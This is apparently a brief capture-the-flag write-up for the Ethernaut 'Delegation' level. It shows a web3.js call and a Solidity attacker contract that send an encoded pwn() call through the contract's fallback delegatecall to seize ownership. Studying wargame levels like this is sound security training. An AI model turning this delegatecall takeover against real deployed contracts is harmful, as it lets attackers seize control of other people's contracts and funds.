+++
title = 'Ethernaut Level 6 - Delegation'
date = 2024-08-04
draft = false

featured_image =  '/images/ethernaut.png'
background_image= '/images/ethernaut.png'
summary = 'Trigger a fallback to win'
tags = [ 'writeups' , 'blockchain' ]
+++
1. With sendTransaction, we are able to trigger the fallback
2. Using abi.encodeFunctionSignature, we have the correct structure for delegateCall
```js
signature = web3.eth.abi.encodeFunctionSignature("pwn()");
await sendTransaction({from: player, to:contract.address, data: signature}); 
```

For some reason if we write a contract that does this, it sets `contract.owner` to the address of the attacking contract and not the player:

```solidity
// SPDX-License-Identifier: GPL-3.0

pragma solidity ^0.8.2;

interface Delegation { }

contract Hack {
    Delegation level6 = Delegation(0x8B659A31E6b5C62C6542FB5175b8cEa6D42A620e);

    function win() public {
        (bool success, ) = address(level6).call(abi.encodeWithSignature("pwn()"));
    }
}
```